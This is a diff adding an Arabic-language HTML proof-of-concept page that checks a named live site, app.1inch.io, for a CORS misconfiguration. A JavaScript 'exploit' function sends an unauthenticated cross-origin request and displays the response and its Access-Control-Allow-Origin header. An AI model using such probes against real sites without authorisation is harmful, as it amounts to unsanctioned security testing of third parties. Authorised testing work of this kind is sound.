@@ -68,4 +68,44 @@
     }
     code {
       background: #2a5a2a;
-      padding: 0.15em
+      padding: 0.15em 0.4em;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🛡️ Bloncli PoC فحص CORS</h1>
+  <p>الدومين المستهدف: <code>https://app.1inch.io</code></p>
+  <button id="launch-btn">🚀 إطلاق الطلب</button>
+  <div id="result">اضغط الزر أعلاه لإرسال الطلب ورؤية النتيجة هنا...</div>
+
+  <script>
+    async function exploit() {
+      const target = "https://app.1inch.io";
+      const resultBox = document.getElementById("result");
+      resultBox.textContent = `جارٍ إرسال طلب GET إلى ${target} ...\n\n`;
+
+      try {
+        const response = await fetch(target, {
+          method: "GET",
+          mode: "cors"
+          // بدون credentials لكي لا يحدث خطأ CORS
+        });
+
+        resultBox.textContent += `حالة الرد: ${response.status} ${response.statusText}\n\n`;
+
+        const text = await response.text();
+        resultBox.textContent += `مقتطف من محتوى الرد:\n${text.substring(0, 2000)}\n\n`;
+
+        const acao = response.headers.get("Access-Control-Allow-Origin");
+        resultBox.textContent += `هيدر Access-Control-Allow-Origin: ${acao ?? "غير موجود"}\n`;
+
+      } catch (error) {
+        resultBox.textContent += `\n❌ حدث خطأ أثناء الطلب:\n${error}`;
+      }
+    }
+
+    document.getElementById("launch-btn").addEventListener("click", exploit);
+  </script>
+</body>
+</html>
